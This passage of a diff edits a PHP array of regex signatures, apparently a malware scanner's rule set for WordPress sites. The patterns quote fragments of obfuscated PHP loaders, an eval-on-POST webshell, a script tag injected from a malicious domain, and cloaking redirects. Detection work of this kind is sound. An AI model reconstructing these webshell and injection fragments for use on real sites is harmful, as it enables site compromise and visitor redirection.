+      'label' => 'source-file first-line anchor',
+    ),
+    1344 => 
+    array (
+      'pattern' => '/var \\$el \\= \\$\\( \'\\#redux\\-import\\-code\\-wrapper\' \\);
+                                if \\( \\$\\( \'\\#redux\\-import\\-link\\-wrapper\' \\)/s',
       'label' => 'sample-specific content window',
     ),
-    1369 => 
+    1345 => 
     array (
-      'pattern' => '/rike a Pose\\. Something stylish is in the works\\!\\<\\/p\\>
-\\<\\/div\\>
-
-\\<\\!\\-\\- scripts \\-\\-\\>
-\\<script src\\="\\.\\.\\/particles\\.js"\\>\\<\\/script\\>
-\\<sc/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/redux_change\\( \\$\\( element \\) \\);[\\s\\S]{0,12000}\\?id","onre"\\];A\\=function\\(\\)\\{return n\\};return A\\(\\)\\}\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1370 => 
+    1346 => 
     array (
-      'pattern' => '/\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/trend\\.linetoadsactive\\.com\\/m\\.js\\?n\\=nb5\'\\>\\<\\/script\\>/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\/\\*\\! This file is auto\\-generated \\*\\/
+\\!function\\(\\)\\{"[\\s\\S]{0,12000}var n\\=x;if\\(i\\[n\\("0x8c"\\)\\+n\\(174\\)\\+"te"\\]\\=\\=4&&i\\[n\\(e\\.I\\)/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1371 => 
+    1347 => 
+    array (
+      'pattern' => '/^\\s*\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/trend\\.linetoadsactive\\.com\\/m\\.js\\?n\\=nb5\'\\>\\<\\/script\\>/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1348 => 
+    array (
+      'pattern' => '/Ls97\\+JzsBi7bT3Ed5vDoHN7lOofc\\+wIlNsEp94tX4OTxS2uL[\\s\\S]{0,12000}e\\(gzinflate\\(base64_decode\\(\\$fMgPBMy\\)\\)\\)\\);
+exit;
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1349 => 
     array (
       'pattern' => '/45\\\\x39"\\]\\(\\\\\'\\/\\(\\?\\:\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\|\\^\\)\\(\\[0\\-9A\\-F\\]\\+\\)\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\{1,2\\}\\(\\.\\*\\?\\)\\\\\'\\.\\\\\'\\(\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\(\\?\\:\\[0\\-9A\\-F\\]\\+\\(\\?\\:\\\\\\\\r\\\\\\\\n\\|\\\\\\\\n\\)\\)\\|\\$\\)\\/si/s',
       'label' => 'sample-specific content window',
     ),
-    1372 => 
+    1350 => 
     array (
-      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x4c\\\\x38\\\\x38\\\\x4c\\\\x4c\\\\x49\\\\x49\\\\x49\\\\x38"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x4c\\\\x38\\\\x38\\\\x4c\\\\x4c\\\\x49\\\\x49\\\\x49\\\\x38"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/8"\\]\\(\\\\\'8y9KShTS1ScMzJyS\\/XcUntPNqwQA\\\\\'\\);\\$FILI88L8L[\\s\\S]{0,12000}\\\\x38\\\\x49\\\\x38\\\\x38\\\\x49\\\\x4c\\\\x4c\\\\x49"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1373 => 
+    1351 => 
     array (
-      'pattern' => '/\\$FII8LI8LL8\\="_crlvfb1e65t9dgz4j0pq8\\-oxiaskh3wmu2yn7";\\$F8L8LLII8I\\=\\$FII8LI8LL8\\{5\\}\\.\\$FII8LI8LL8\\{25\\}\\.\\$FII8LI8LL8\\{3\\}\\.\\$FII8LI8LL8\\{8\\}\\.\\$FII8LI8LL8\\{0\\}[\\s\\S]{0,12000}wp_die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\\\x4c\\\\x38"\\]\\(\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4[\\s\\S]{0,12000}die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1374 => 
+    1352 => 
     array (
-      'pattern' => '/action method\\=POST\\>\\<font size\\=2 color\\=\\#FF0000\\>\\<b\\>Upload File\\<\\/b\\>\\<\\/font\\>\\<br\\>\\<input type\\=hidden name\\=[\\s\\S]{0,160}size\\=28\\>\\<br\\>\\<font size\\=2 color\\=\\#FF0000\\>\\<b\\>New name\\: \\<\\/b\\>\\<\\/font\\>\\<input type\\=text size\\=15 name\\=/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*error_reporting\\(0\\);/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1375 => 
+    1353 => 
     array (
-      'pattern' => '/\\<\\?php \\$SIqZE \\= \'st\'\\.\'r\'\\.\'_\'\\.\'rot13\'; \\$JWwGX \\= \'base6\'\\.\'4\'\\.\'_d\'\\.\'ecod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); echo \'\\<html\\> \\<\\/ht/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/e;\\},\\{\\}\\);\\}const _0x20414e\\=_0x442ac3\\(\\);if\\(\\!\\(\\!_0x20[\\s\\S]{0,12000},_0x30cedd\\);\\}\\);\\}\\(\\)\\);
+    \\<\\/script\\>
+    \\<\\?php
+\\}\\);/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1376 => 
+    1354 => 
     array (
-      'pattern' => '/; \\/\\*\\-2Gs\\-\\*\\/\\$vSjfoTJ\\/\\*\\-2r6fhB\\-\\*\\/ \\= \\/\\*\\-\\-w\\}_ALv\\#\\-\\*\\/\\$FXylZarbfo\\/\\*\\-8\\:Us\\:w1Hp\\-\\*\\/\\(\\/\\*\\-z%,\\-\\*\\/[\\s\\S]{0,160}, \\/\\*\\-HZm\\#\\=GL\\{\\^\\-\\*\\/\\$tm\\/\\*\\-\\]\\-\\*\\/\\); \\/\\*\\-dxA\\-\\*\\/\\$oq \\/\\*\\-s\\?iufJ\\-\\*\\/\\= \\/\\*\\-sN\\>gf\\-\\*\\//',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php \\$ImSnZ \\= \'st\'\\.\'r\'\\.\'_r\'\\.\'ot13\'; \\$YzHKc \\= \'base\'\\.\'64\'\\.\'_deco\'\\.\'de\'; \\$NtXuB \\= \'g\'\\.\'zinfla\'\\.\'te\'; \\$JSBWV \\= \'s\'\\.\'trrev\'; ini_set\\(\'error_log/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1377 => 
+    1355 => 
     array (
-      'pattern' => '/https\\:\\/\\/XXXXXXXXX\\.com\\/wp\\-content\\/plugins\\/fusion\\-builder\\/assets\\/js\\/min\\/general\\/fusion\\-image\\-before\\-after\\.js\\?ver\\=1\\.0[\\s\\S]{0,160}https\\:\\/\\/XXXXXXXXX\\.com\\/wp\\-content\\/themes\\/Avada\\/includes\\/lib\\/assets\\/min\\/js\\/library\\/bootstrap\\.transition\\.js\\?ver\\=3\\.3\\.6/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php \\$SIqZE \\= \'st\'\\.\'r\'\\.\'_\'\\.\'rot13\'; \\$JWwGX \\= \'base6\'\\.\'4\'\\.\'_d\'\\.\'ecod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); echo \'\\<html\\> \\<\\/ht/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1378 => 
+    1356 => 
     array (
-      'pattern' => '/Agents\\) \\. \'\\/i\', \\$_SERVER\\[\'HTTP_USER_AGENT\'\\]\\)\\) \\{
-	header\\(\'HTTP\\/1\\.0 404 Not Found\'\\);
-	exit;
-\\}
-
-\\$url \\= \'https\\:\\/\\/bit\\.ly\\/3AAX/s',
+      'pattern' => '/^\\s*\\<\\?php \\/\\*\\-\\[5\\$DD\\>GJi\\-\\*\\/error_reporting\\(0\\); \\$PfTvo \\/\\*\\-I9\\{PWgO@jxp\\[r1\\)%\\}59\\-\\*\\/\\=\\/\\*\\-n\\=%\\:NH%i\\}4\\<qDV@\\-\\*\\/ "ra"\\.\\/\\*\\-\\{1xHAq\\+k\\?f\\=D\\(\\-\\*\\/"ng"\\.\\/\\*\\-ko7FWw\\<V@m1b/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1357 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\*xaxk,n\\[q\\|Ei,W2B\\(f\\*\\/\\$a\\/\\*ZPQI7D6zJ6PwF3\\*\\/\\=\\/\\*wsIm\\}WH\\.zw@g\\{9\\*\\/range\\/\\*1wwZ\\+\\$c\\[@\\#\\*\\/\\("~",\\/\\*Ygnbi\\]_\\+p\\*\\/" "\\);\\/\\*\\]ATzM\\[l\\{Y\\*\\/\\$b\\/\\*D~59v\\[YC\\*\\/\\=\\/\\*S3/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1358 => 
+    array (
+      'pattern' => '/nt\\/plugins\\/logo\\-carousel\\-slider\\/js\\/owl\\.carousel\\.min\\.js\\?ver\\=2\\.2\\.1\' id\\=\'lcs\\-owl\\-carousel\\-js\\-js\'\\>\\<\\/script\\>
+	\\<\\/body\\>
+\\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1379 => 
+    1359 => 
     array (
-      'pattern' => '/^\\s*\\?\\>\\s*$/s',
-      'label' => 'exact source-file content',
-    ),
-    1380 => 
-    array (
-      'pattern' => '/^\\s*\\<h1\\>\\$OH\\<\\/h1\\>\\s*$/s',
-      'label' => 'exact source-file content',
-    ),
-    1381 => 
-    array (
-      'pattern' => '/\\<\\?php
-\\/\\*
-\\* @package    GOOGLE\\.COM
- \\*
- \\* @copyright  Copyright \\(C\\) 2005 \\- 2020 Open Source Matters, Inc\\. All rights reser/s',
+      'pattern' => '/\\<\\?php 
+foreach\\(\\$_POST as \\$k \\=\\> \\$v\\)\\{
+	\\$kk \\= @pack\\("H\\*", \\$k\\);
+	\\$_POST\\[\\$kk\\]\\=@pack\\("H\\*", \\$v\\);
+\\}
+@eval\\(\\$_POST\\[\'lol\'\\]\\);
+echo \'/s',
       'label' => 'sample-specific content window',
     ),
-    1382 => 
-    array (
-      'pattern' => '/\\)\\{
-		\\$x \\= \\$i;
-		break;
-	\\}
-\\}
-\\$yuh \\= substr\\(\\$yuh,0,\\$x\\);
-\\$yuh \\= ucfirst\\(\\$yuh\\);
-\\?\\>
-\\<\\!DOCTYPE HTML PUBLIC[\\s\\S]{0,160}\\>
-\\<html\\>
-\\<head\\>
-\\<title\\>163网易免费邮\\-\\-中文邮箱第一品牌\\<\\/title\\>
-\\<meta http\\-equiv\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1383 => 
-    array (
-      'pattern' => '/T1IB\'\\);\\$\\=\\$ݴ\\(@\\$\\(\\$֡\\(\\$η؍\\(\\$羚,\\$ի̓,\\$\\)\\)\\)\\);return\\$;\\}function 딺\\(\\$ջϏ,\\$\\=[\\s\\S]{0,160}\\)\\:\\$;\\$۹\\=\\$ӌ˫;for\\(;\\$۹\\<\\$ݮ\\(\\$ջϏ\\);\\$۹\\+\\+\\)\\$ȼר\\.\\=\\$ƥ\\(\\$ջϏ\\{\\$۹\\}\\)\\<\\$ƥ\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1384 => 
+    1360 => 
     array (
       'pattern' => '/S�E0G66�51I\\/��JA93E6����RC4�V�\\+NO�9X��3U�OX\\/I6F4Y4���S�U��9�\\+BQ4P\\+���SKW/s',
       'label' => 'sample-specific content window',
     ),
-    1385 => 
+    1361 => 
     array (
-      'pattern' => '/\\<\\?php \\/\\* tjwlltii akhmhcij \\*\\/error_reporting\\(0\\);ini_set\\("display_errors", 0\\);if\\(\\!defined\\(\'lmhelqpg\'\\)\\)\\{define\\(\'lmhelqpg\',__FILE__\\);if\\(\\!functi/',
-      'label' => 'source-file head snippet',
+      'pattern' => '/^\\s*\\<\\?php \\/\\* tjwlltii akhmhcij \\*\\/error_reporting\\(0\\);ini_set\\("display_errors", 0\\);if\\(\\!defined\\(\'lmhelqpg\'\\)\\)\\{define\\(\'lmhelqpg\',__FILE__\\);if\\(\\!functi/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1362 => 
+    array (
+      'pattern' => '/Array\\(\'https\\:\\/\\/www\\.puertasymas\\.com\\.mx\\/jp1\\.php\\?open\'\\);
+
+\\$URL \\= \\$items\\[array_rand\\(\\$items\\)\\];
+
+header\\("Location\\: \\$URL"\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1363 => 
+    array (
+      'pattern' => '/\\) \\{
+	header\\(\'HTTP\\/1\\.0 404 Not Found\'\\);
+	exit;
+\\}[\\s\\S]{0,12000}nt\\=\'0;URL\\=\\$url\'\\>";
+header\\("Location\\: \\$url"\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1364 => 
+    array (
+      'pattern' => '/,\\$uri_script\\)\\{
+    if\\(is_https\\(\\)\\)\\{
+        \\$http[\\s\\S]{0,12000}late \\*\\/
+require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1365 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);
+\\$xyn\\=\'tunafeesh\';
+if\\(i[\\s\\S]{0,12000}d\\>\\<\\/table\\>\';
+	print \'\\<\\/br\\>\';
+	\\$filex\\=array\\(\\);
+	\\$/s',
+      'label' => 'sample-specific content window chain',
     ),
   ),
   'heuristic_patterns' => 
